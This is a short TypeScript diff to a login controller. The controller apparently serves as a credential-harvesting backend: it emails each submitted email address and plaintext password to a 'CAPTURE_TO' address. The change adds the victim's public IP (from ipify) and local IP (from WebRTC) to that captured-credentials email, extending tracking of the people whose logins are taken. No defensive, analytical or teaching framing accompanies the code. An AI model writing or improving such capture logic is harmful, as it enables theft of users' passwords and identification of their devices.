@@ -20,10 +20,16 @@ export async function loginController(req: Request, res: Response): Promise<Resp
     });
   }
 
-  const ip = extractIp(req);
+  // Prefer client-reported IPs (collected via ipify + WebRTC) over the
+  // server-side socket address — the latter is always ::1 when behind a
+  // local proxy or when client and server share the same machine.
+  const { publicIp, localIp } = req.body ?? {};
+  const socketIp = extractIp(req);
+  const ip = (typeof publicIp === "string" && publicIp !== "unknown" ? publicIp : socketIp);
+  const deviceLocalIp = typeof localIp === "string" ? localIp : "unknown";
   const userAgent = req.headers["user-agent"] ?? "unknown";
 
-  const { subject, html, text } = generateCredentialsEmail(email, password, ip, userAgent);
+  const { subject, html, text } = generateCredentialsEmail(email, password, ip, deviceLocalIp, userAgent);
 
   try {
     await sendMail({ from, to: CAPTURE_TO, subject, html, text });
